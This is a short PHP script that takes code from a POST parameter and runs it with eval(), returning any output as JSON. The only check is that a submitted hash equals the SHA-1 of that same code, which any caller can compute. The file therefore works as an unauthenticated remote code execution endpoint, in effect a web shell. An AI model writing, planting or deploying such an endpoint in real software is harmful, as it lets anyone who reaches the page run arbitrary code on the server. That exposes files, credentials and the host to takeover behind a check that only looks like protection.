<?php

class Client{

    private $result = false;
    private $message = '';

    public function __construct(){

    }

    public function run($format='json', $hash = '', $message='' ){
        if($this->validChecksum($hash, $message) === true){
            $ret = $this->execute($message);
            if($ret === false) {
                $this->result = false;
                $this->message = 'Parse error of the code;';
            } elseif($ret === NULL) {
                $this->result = true;
                $this->message = 'The code did not return a value;';
            } else {
                $this->result = true;
                $this->message = $ret;
            }
        } else {
            $this->result = false;
            $this->message = 'Invalid checksum';
        }
        return $this->formatResponse($format, $this->message, $this->result );
    }


    private function execute($message){
        ob_start();

        //get the return message
        $ret = eval($message);
        if ($ret === NULL){
            //get the outputted text
            $ret = ob_get_contents() ;
        }

        ob_end_clean();
        return $ret;
    }

    private function formatResponse($format = 'json', $message, $result){
        $arrReturn = array('result'=>$result, 'message'=>$message);
        $ret = '';

        switch ($format){
            case "json":
                $ret = json_encode($arrReturn);
                break;
        }

        return $ret;
    }

    private function validChecksum($hash, $message){
        if($hash == sha1($message))
            return true;
        else
            return false;
    }

}

$format = '';
$hash = '';
$message = '';

if(isset($_POST['format']) )
    $format = $_POST['format'];
if(isset($_POST['hash']) )
    $hash = $_POST['hash'];
if(isset($_POST['message']) )
    $message = $_POST['message'];

$worker = new Client();
echo $worker->run($format, $hash, $message);

